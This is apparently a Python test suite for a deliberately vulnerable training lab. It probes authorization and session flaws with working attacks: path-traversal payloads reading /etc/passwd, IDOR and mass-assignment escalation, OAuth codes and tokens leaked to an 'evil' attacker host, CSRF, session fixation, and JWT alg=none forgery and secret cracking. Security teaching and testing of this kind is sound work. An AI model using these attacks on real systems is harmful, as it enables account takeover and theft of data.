"""WSTG probes for machine 03 - Authorization + Session Management.

Each probe asserts that the intentional weakness is demonstrably present.
Stdlib only. All probes create/reset their own state and are idempotent.
"""
import base64
import hashlib
import hmac
import json
import time
import urllib.parse

from labhttp import get, post, request

FLAG = "WSTG-M03{traversal_outside_the_docroot}"
FORM = {"Content-Type": "application/x-www-form-urlencoded"}


# --- helpers ------------------------------------------------------------------

def _login(ctx, user, password="Password123!", headers=None):
    s = ctx.session()
    r = s.form("/login", {"username": user, "password": password}, headers=headers)
    if r.status != 200 or not r.json().get("ok"):
        raise RuntimeError(f"login {user} failed: {r.status} {r.text[:120]}")
    return s


def _cookie_req(ctx, method, path, sid, extra=None, data=None):
    headers = {"Cookie": f"SID={sid}"}
    headers.update(extra or {})
    return request(method, ctx.url(path), headers=headers, data=data)


def _b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64u_dec(seg):
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _evil_clear(ctx):
    post(ctx.url("evil") + "/clear")


def _evil_logs(ctx):
    return get(ctx.url("evil") + "/logs").json()


def _authorize(ctx, **params):
    q = urllib.parse.urlencode(params)
    return get(ctx.url("as") + "/oauth/authorize?" + q)


def _loc_param(resp, name):
    loc = resp.header("Location", "")
    query = urllib.parse.urlsplit(loc).query
    vals = urllib.parse.parse_qs(query).get(name)
    return vals[0] if vals else None


def _token_req(ctx, params, in_query=False):
    q = urllib.parse.urlencode(params)
    if in_query:
        return post(ctx.url("as") + "/oauth/token?" + q)
    return post(ctx.url("as") + "/oauth/token", data=q, headers=FORM)


# --- WSTG-ATHZ ------------------------------------------------------------------

def athz_01(ctx):
    checks = {}
    for label, name in [("dotdot", "../secret/flag.txt"),
                        ("encoded", "..%2fsecret%2fflag.txt"),
                        ("absolute", "/srv/secret/flag.txt")]:
        r = get(ctx.url("/files/download?name=" + name))
        checks[label] = r.status == 200 and FLAG in r.text
    r = get(ctx.url("/files/download?name=/etc/passwd"))
    checks["etc_passwd"] = r.status == 200 and "root:" in r.text
    for label, path in [("filter_bypass", "....//secret/flag.txt"),
                        ("double_encoded", "..%252fsecret%252fflag.txt")]:
        r = get(ctx.url("/files/fetch?path=" + path))
        checks[label] = r.status == 200 and FLAG in r.text
    return all(checks.values()), f"traversal reads flag outside docroot: {checks}"


def athz_02(ctx):
    checks = {}
    r = get(ctx.url("/admin/users"))  # forced browsing, anonymous
    checks["forced_browsing"] = r.status == 200 and "alice@corp.lab" in r.text
    bob = _login(ctx, "bob")
    r = bob.form("/admin/announce", {"message": "athz02-probe"})
    checks["unchecked_post"] = r.status == 201
    g = bob.get("/admin/export")
    p = bob.post("/admin/export")
    checks["method_switch"] = (g.status == 403 and p.status == 200
                               and "alice@corp.lab" in p.text)
    panel = bob.get("/admin/panel")
    checks["clientside_only"] = (panel.status == 200
                                 and 'role === "admin"' in panel.text)
    r = bob.form("/admin/settings", {"role": "admin", "maintenance": "true"})
    checks["trusts_client_role"] = r.status == 200 and r.json().get("ok")
    bob.form("/admin/settings", {"role": "admin", "maintenance": "false"})  # cleanup
    return all(checks.values()), f"authorization schema bypasses: {checks}"


def athz_03(ctx):
    bob = _login(ctx, "bob")
    bob.form("/profile/update", {"role": "user"})  # reset so escalation is real
    before = bob.get("/admin")
    esc = bob.form("/profile/update", {"role": "admin"})
    after = bob.get("/admin")
    bob.form("/profile/update", {"role": "user"})  # cleanup
    ok = (before.status == 403 and esc.json().get("role") == "admin"
          and after.status == 200)
    return ok, (f"mass assignment role=admin: /admin {before.status}->{after.status}, "
                f"profile says role={esc.json().get('role')}")


def athz_04(ctx):
    checks = {}
    bob = _login(ctx, "bob")
    doc = bob.get("/documents/1")
    checks["cross_user_read"] = (doc.status == 200
                                 and doc.json()["owner"] == "alice"
                                 and "ALICE-SECRET" in doc.json()["body"])
    original = doc.json()["body"]
    marker = f"IDOR-WRITE-{int(time.time())}"
    bob.form("/documents/1/edit", {"body": marker})
    reread = bob.get("/documents/1")
    checks["cross_user_write"] = marker in reread.json()["body"]
    bob.form("/documents/1/edit", {"body": original})  # restore
    alice = _login(ctx, "alice")
    order = alice.get("/orders/1002")
    checks["order_idor"] = (order.status == 200 and order.json()["owner"] == "bob"
                            and order.json()["item"] == "Keyboard")
    users = bob.get("/api/users").json()
    alice_uuid = next(u["message_uuid"] for u in users if u["username"] == "alice")
    msg = bob.get(f"/messages/{alice_uuid}")
    checks["uuid_leak_then_read"] = (msg.status == 200
                                     and "ALICE-MSG-SECRET" in msg.json()["body"])
    return all(checks.values()), f"IDOR read/write + leaked UUID: {checks}"


def athz_05(ctx):
    checks = {}
    as_url = ctx.url("as")
    evil = ctx.url("evil")
    legit = "http://127.0.0.1:8300/oauth/callback"
    creds = {"username": "alice", "password": "Password123!"}

    # -- 05.1 Authorization Server weaknesses --
    _evil_clear(ctx)
    evil_redirect = f"{evil}/steal?legit={legit}"
    r = _authorize(ctx, response_type="code", client_id="portal",
                   redirect_uri=evil_redirect, scope="read", **creds)
    code = _loc_param(r, "code")
    checks["as_redirect_substring"] = (r.status == 302 and code
                                       and r.header("Location", "").startswith(evil))
    get(r.header("Location", ""))  # attacker host receives the code
    checks["as_code_captured"] = any("code=" in e["query"] for e in _evil_logs(ctx))
    r = _authorize(ctx, response_type="code", client_id="portal",
                   redirect_uri=legit + "/../evil", scope="read", **creds)
    checks["as_redirect_traversal"] = (r.status == 302 and _loc_param(r, "code")
                                       and "/../evil" in r.header("Location", ""))

    base = {"grant_type": "authorization_code", "code": code,
            "client_id": "portal", "client_secret": "portal-secret",
            "redirect_uri": legit}
    t1 = _token_req(ctx, base, in_query=True)  # secret in URL query
    checks["as_secret_in_query"] = t1.status == 200 and "access_token" in t1.json()
    t2 = _token_req(ctx, base)
    checks["as_code_replay"] = (t2.status == 200
                                and t2.json()["access_token"] != t1.json()["access_token"])
    post(as_url + "/debug/expire-code", data=f"code={code}", headers=FORM)
    t3 = _token_req(ctx, base)
    checks["as_expired_code"] = t3.status == 200
    t4 = _token_req(ctx, {**base, "client_id": "mobile", "client_secret": "mobile-secret"})
    checks["as_code_not_client_bound"] = t4.status == 200

    r = _authorize(ctx, response_type="code", client_id="portal",
                   redirect_uri=legit, scope="read",
                   username="bob", password="Password123!")
    code2 = _loc_param(r, "code")
    t5 = _token_req(ctx, {**base, "code": code2, "scope": "admin"})
    admin_tok = t5.json().get("access_token", "")
    res = get(as_url + "/api/resource?access_token=" + admin_tok)
    checks["as_scope_escalation"] = (t5.json().get("scope") == "admin"
                                     and res.status == 200
                                     and "ADMIN-AS-SECRET" in res.text)

    # -- 05.2 OAuth Client weaknesses --
    r = get(ctx.url("/oauth/login"))
    checks["cl_no_state"] = (r.status == 302
                             and "state=" not in r.header("Location", ""))
    r = _authorize(ctx, response_type="code", client_id="portal",
                   redirect_uri=legit, scope="read",
                   username="bob", password="Password123!")
    bob_code = _loc_param(r, "code")
    alice = _login(ctx, "alice")
    csrf = alice.get(f"/oauth/callback?code={bob_code}")  # no state -> login CSRF
    me = alice.get("/api/me")
    checks["cl_login_csrf"] = (csrf.status == 200
                               and csrf.json().get("logged_in_as") == "bob"
                               and me.json().get("user") == "bob")
    r = _authorize(ctx, response_type="code", client_id="portal",
                   redirect_uri=legit, scope="read",
                   code_challenge="probe-challenge-123",
                   code_challenge_method="plain", **creds)
    pkce_code = _loc_param(r, "code")
    t6 = _token_req(ctx, {**base, "code": pkce_code})  # no code_verifier
    checks["cl_pkce_downgrade"] = t6.status == 200 and "access_token" in t6.json()
    r = get(ctx.url("/redirect?to=" + urllib.parse.quote(evil + "/steal", safe="")))
    checks["cl_open_redirect"] = (r.status == 302
                                  and r.header("Location", "").startswith(evil))

    leak_tok = t1.json()["access_token"]
    page_url = ctx.url(f"/oauth/connected?access_token={leak_tok}")
    page = get(page_url)
    _evil_clear(ctx)
    get(evil + "/pixel", headers={"Referer": page_url})  # browser-equivalent fetch
    leaked = any(leak_tok in e["referer"] for e in _evil_logs(ctx))
    ui = get(as_url + "/oauth/userinfo?access_token=" + leak_tok)
    checks["cl_referer_token_leak"] = (page.status == 200 and leaked
                                       and ui.json().get("sub") == "alice")
    r = _authorize(ctx, response_type="token", client_id="portal",
                   redirect_uri=legit, scope="read", **creds)
    checks["cl_implicit_fragment"] = (r.status == 302
                                      and "#access_token=" in r.header("Location", ""))

    ok = all(bool(v) for v in checks.values())
    return ok, f"OAuth AS(05.1)+client(05.2): {checks}"


# --- WSTG-SESS ------------------------------------------------------------------

def sess_01(ctx):
    s1, s2 = ctx.session(), ctx.session()
    s1.get("/")
    s2.get("/")
    n1, n2 = int(s1.cookies["SID"]), int(s2.cookies["SID"])
    predicted = str(n2 + 1)
    victim = ctx.session()
    victim.cookies["SID"] = predicted  # pre-set the predicted next id
    victim.form("/login", {"username": "bob", "password": "Password123!"})
    r = _cookie_req(ctx, "GET", "/api/me", predicted)
    ok = (n2 == n1 + 1 and r.status == 200 and r.json().get("user") == "bob")
    return ok, (f"sequential SIDs {n1},{n2}; predicted {predicted} -> "
                f"authenticated as {r.json().get('user')}")


def sess_02(ctx):
    r = post(ctx.url("/login"),
             data="username=alice&password=Password123%21", headers=FORM)
    cookies = [v for v in r.header_all("set-cookie") if v.startswith("SID=")]
    home = get(ctx.url("/"))
    cookies += [v for v in home.header_all("set-cookie") if v.startswith("SID=")]
    low = " ".join(cookies).lower()
    ok = (bool(cookies) and "httponly" not in low and "secure" not in low
          and "samesite" not in low)
    return ok, f"session cookie attributes absent: {cookies[:1]}"


def sess_03(ctx):
    fixed = "9" + str(int(time.time()))  # attacker-chosen id, unique per run
    _cookie_req(ctx, "GET", "/", fixed)  # server adopts it pre-auth
    r = _cookie_req(ctx, "POST", "/login", fixed, extra=FORM,
                    data="username=alice&password=Password123%21")
    rotated = [v for v in r.header_all("set-cookie")
               if v.startswith("SID=") and not v.startswith(f"SID={fixed};")]
    me = _cookie_req(ctx, "GET", "/api/me", fixed)
    ok = (r.status == 200 and not rotated and me.status == 200
          and me.json().get("user") == "alice" and me.json().get("sid") == fixed)
    return ok, f"fixated SID {fixed} survives login (rotated={bool(rotated)}), /api/me={me.json().get('user')}"


def sess_04(ctx):
    alice = _login(ctx, "alice")
    sid = alice.cookies["SID"]
    r = get(ctx.url(f"/api/me?sid={sid}"))  # no cookie at all
    url_ok = r.status == 200 and r.json().get("user") == "alice"
    dash_url = ctx.url(f"/dashboard?sid={sid}")
    dash = alice.get(f"/dashboard?sid={sid}")
    hidden_ok = f'name="sid" value="{sid}"' in dash.text
    pixel_ok = ctx.url("evil") + "/pixel" in dash.text
    _evil_clear(ctx)
    get(ctx.url("evil") + "/pixel", headers={"Referer": dash_url})
    referer_ok = any(sid in e["referer"] for e in _evil_logs(ctx))
    ok = url_ok and hidden_ok and pixel_ok and referer_ok
    return ok, (f"sid in URL works={url_ok}, hidden field={hidden_ok}, "
                f"3rd-party img={pixel_ok}, Referer leak captured={referer_ok}")


def sess_05(ctx):
    alice = _login(ctx, "alice")
    sid = alice.cookies["SID"]
    before = alice.get("/api/me").json()["balance"]
    attack_page = get(ctx.url("evil") + "/csrf")
    page_ok = "action=\"http://127.0.0.1:8300/transfer\"" in attack_page.text
    # Cross-origin form post: only the cookie, attacker Origin/Referer, no token.
    r = _cookie_req(ctx, "POST", "/transfer", sid,
                    extra={**FORM, "Origin": ctx.url("evil"),
                           "Referer": ctx.url("evil") + "/csrf"},
                    data="to=bob&amount=50")
    after = alice.get("/api/me").json()["balance"]
    ok = page_ok and r.status == 200 and after == before - 50
    return ok, (f"cross-origin POST with cookie only: balance {before}->{after}, "
                f"attack page served={page_ok}")


def sess_06(ctx):
    alice = _login(ctx, "alice")
    sid = alice.cookies["SID"]
    out = alice.post("/logout")
    cleared = any("Expires=Thu, 01 Jan 1970" in v
                  for v in out.header_all("set-cookie"))
    r = _cookie_req(ctx, "GET", "/api/me", sid)  # replay the old id
    ok = out.status == 200 and cleared and r.status == 200 and r.json().get("user") == "alice"
    return ok, f"logout cleared cookie={cleared}; old SID still authenticates as {r.json().get('user')}"


def sess_07(ctx):
    alice = _login(ctx, "alice")
    sid = alice.cookies["SID"]
    policy = get(ctx.url("/api/session-policy")).json()
    no_timeouts = (policy["idle_timeout_seconds"] is None
                   and policy["absolute_timeout_seconds"] is None)
    aged = post(ctx.url("/debug/age-session"),
                data=f"sid={sid}&seconds=2592000", headers=FORM)  # 30 days
    r = _cookie_req(ctx, "GET", "/api/me", sid)
    age = time.time() - r.json().get("session_created", time.time()) if r.status == 200 else 0
    ok = no_timeouts and aged.status == 200 and r.status == 200 and age > 2500000
    return ok, f"policy timeouts={policy['idle_timeout_seconds']}/{policy['absolute_timeout_seconds']}; 30-day-old session still valid (age={int(age)}s)"


def sess_08(ctx):
    s = ctx.session()  # anonymous, never authenticates
    req = s.form("/reset/request", {"username": "admin"})
    token = req.json().get("token", "")
    conf = s.form("/reset/confirm", {"token": token})
    me = s.get("/api/me")
    admin = s.get("/admin")
    ok = (conf.status == 200 and me.status == 200
          and me.json().get("user") == "admin" and admin.status == 200)
    return ok, (f"reset flow set session['user']: /api/me={me.json().get('user')}, "
                f"/admin={admin.status} without any password")


def sess_09(ctx):
    alice = _login(ctx, "alice", headers={"User-Agent": "Alice-Firefox/128.0"})
    sid = alice.cookies["SID"]
    attacker_headers = {"User-Agent": "attacker-curl/8.0",
                        "X-Forwarded-For": "203.0.113.9"}
    me = _cookie_req(ctx, "GET", "/api/me", sid, extra=attacker_headers)
    doc = _cookie_req(ctx, "GET", "/documents/1", sid, extra=attacker_headers)
    ok = (sid.isdigit() and me.status == 200 and me.json().get("user") == "alice"
          and doc.status == 200 and "ALICE-SECRET" in doc.json()["body"])
    return ok, (f"numeric SID {sid} replayed over HTTP from different UA/IP -> "
                f"user={me.json().get('user')}, private doc read={doc.status}")


def sess_10(ctx):
    r = post(ctx.url("/api/token"),
             data={"username": "alice", "password": "Password123!"})
    tok = r.json()["token"]
    h, p, sig = tok.split(".")
    checks = {"issued_sub": json.loads(_b64u_dec(p)).get("sub") == "alice"}

    # 1) alg=none unsigned admin token
    none_tok = (_b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode()) + "."
                + _b64u(json.dumps({"sub": "admin", "role": "admin"}).encode()) + ".")
    r1 = get(ctx.url("/api/v2/admin"),
             headers={"Authorization": "Bearer " + none_tok})
    checks["alg_none"] = r1.status == 200 and "ADMIN-JWT-SECRET" in r1.text

    # 2) brute-force the HMAC secret from a small wordlist, then forge
    words = ["123456", "password", "secret", "jwt", "admin", "key",
             "changeme", "supersecret"]
    found = next((w for w in words
                  if _b64u(hmac.new(w.encode(), f"{h}.{p}".encode(),
                                    hashlib.sha256).digest()) == sig), None)
    forged = None
    if found:
        payload = {"sub": "admin", "role": "admin", "exp": int(time.time()) + 3600}
        hp = (_b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()) + "."
              + _b64u(json.dumps(payload).encode()))
        forged = hp + "." + _b64u(hmac.new(found.encode(), hp.encode(),
                                           hashlib.sha256).digest())
    r2 = get(ctx.url("/api/v2/admin"),
             headers={"Authorization": "Bearer " + (forged or "")})
    checks["weak_secret_forge"] = (found == "secret" and r2.status == 200
                                   and "ADMIN-JWT-SECRET" in r2.text)

    # 3) expired token accepted (no exp validation)
    payload = {"sub": "alice", "role": "user", "exp": int(time.time()) - 100000}
    hp = (_b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()) + "."
          + _b64u(json.dumps(payload).encode()))
    expired = hp + "." + _b64u(hmac.new(b"secret", hp.encode(), hashlib.sha256).digest())
    r3 = get(ctx.url("/api/v2/me"), headers={"Authorization": "Bearer " + expired})
    checks["expired_accepted"] = r3.status == 200 and r3.json().get("sub") == "alice"

    return all(checks.values()), f"JWT weaknesses (cracked secret={found!r}): {checks}"


def sess_11(ctx):
    sessions = [_login(ctx, "alice") for _ in range(5)]
    before = [s.get("/api/me").status for s in sessions]
    chg = sessions[0].form("/account/password", {"new_password": "Password123!"})
    invalidated = chg.json().get("sessions_invalidated")
    after = [s.get("/api/me").json().get("user") for s in sessions]
    fresh = _login(ctx, "alice")  # password still usable, idempotent re-runs
    ok = (before == [200] * 5 and chg.status == 200 and invalidated == 0
          and after == ["alice"] * 5 and fresh.get("/api/me").status == 200)
    return ok, (f"5 concurrent sessions before={before}, password change "
                f"invalidated={invalidated}, all still alive after={after}")